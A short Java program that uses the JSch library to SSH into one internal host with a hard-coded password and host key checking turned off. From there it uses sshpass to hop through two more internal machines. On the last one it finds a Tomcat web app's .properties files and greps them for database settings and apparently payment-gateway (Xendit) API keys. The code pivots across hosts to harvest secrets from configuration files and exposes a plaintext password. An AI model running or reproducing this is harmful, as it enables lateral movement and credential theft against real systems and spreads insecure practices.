import com.jcraft.jsch.*;
import java.io.*;
class XM7 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 \"echo ---FIND-PROPS---;find /progs/noxify/ -maxdepth 8 -name \\\"*.properties\\\" 2>/dev/null | head -15;echo ---WEBAPP-CLASSES---;ls /progs/noxify/noxify-app/tomcat/7.0.109/webapps/ROOT/WEB-INF/classes/*.properties 2>/dev/null;echo ---DB-PROP---;grep -iE \\\"db\\\\.\\\\|xendit\\\\|xnd_\\\" /progs/noxify/noxify-app/tomcat/7.0.109/webapps/ROOT/WEB-INF/classes/*.properties 2>/dev/null | head -15\" 2>&1' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
